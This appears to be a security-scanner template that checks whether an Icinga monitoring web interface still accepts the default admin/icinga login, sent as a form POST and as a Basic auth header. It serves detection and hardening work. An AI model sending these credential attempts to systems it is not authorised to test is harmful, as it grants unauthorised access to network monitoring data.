name: Icinga Default Credentials
description: Attempts to authenticate to Icinga monitoring web interface using default admin/icinga credentials. Successful access exposes network monitoring data and host configurations.
severity: high
cwe: CWE-1392

requests:
  - method: POST
    path: /icinga/authentication/login
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "username=admin&password=icinga"
  - method: GET
    path: /icingaweb2/authentication/login
    headers:
      Authorization: "Basic YWRtaW46aWNpbmdh"

matchers:
  - body_contains: "Icinga"
  - body_contains: "icingaweb"
  - header_contains: "Icingaweb2"
  - status_code: 200
